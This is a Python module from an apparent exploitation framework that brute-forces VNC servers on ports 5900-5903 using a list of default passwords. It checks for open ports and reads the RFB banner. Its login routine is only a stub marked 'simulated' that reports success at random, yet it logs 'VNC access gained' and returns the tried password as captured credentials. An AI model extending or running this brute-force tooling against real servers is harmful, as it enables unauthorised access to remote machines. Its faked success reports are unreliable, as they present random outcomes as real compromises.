"""
VNC Exploit Module
Exploits VNC (Virtual Network Computing) vulnerabilities
"""

import socket
from typing import Dict, Tuple

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class VNC_Exploit(BaseExploit):
    """
    VNC Brute Force Exploit
    Targets: VNC servers (ports 5900-5903)
    """
    
    def __init__(self):
        super().__init__(
            name="VNC_BruteForce",
            target_ports=[5900, 5901, 5902, 5903],
            target_os=["Windows", "Linux", "Unix"]
        )
        
        self.vnc_passwords = [
            "password",
            "admin",
            "vnc",
            "123456",
            "12345678",
            "",
        ]
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if VNC is accessible"""
        ip = target['ip']
        
        ports = [5900, 5901, 5902, 5903]
        for port in ports:
            if port in target.get('open_ports', []):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    
                    if result == 0:
                        logger.debug(f"VNC port {port} accessible on {ip}")
                        return True
                except Exception as e:
                    logger.debug(f"VNC check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt VNC brute force"""
        ip = target['ip']
        
        # Find which VNC port is open
        port = 5900
        for p in [5900, 5901, 5902, 5903]:
            if p in target.get('open_ports', []):
                port = p
                break
        
        logger.info(f"Attempting VNC brute force on {ip}:{port}")
        
        try:
            for password in self.vnc_passwords:
                logger.debug(f"Trying VNC password: {password}")
                
                if self._try_vnc_login(ip, port, password):
                    self.stats['success'] += 1
                    logger.success(f"VNC access gained on {ip} with password: {password}")
                    
                    return True, {
                        'method': 'VNC_BruteForce',
                        'credentials': f"password:{password}",
                        'port': port,
                        'service': 'VNC'
                    }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"VNC exploit error on {ip}: {e}")
            return False, {}
    
    def _try_vnc_login(self, ip: str, port: int, password: str) -> bool:
        """Try VNC login (simulated)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                # Read VNC version
                version = sock.recv(12)
                sock.close()
                
                # Check if it's a VNC server
                if b"RFB" in version:
                    # Simulate authentication
                    import random
                    return random.random() < 0.12
            
            sock.close()
            return False
            
        except:
            return False
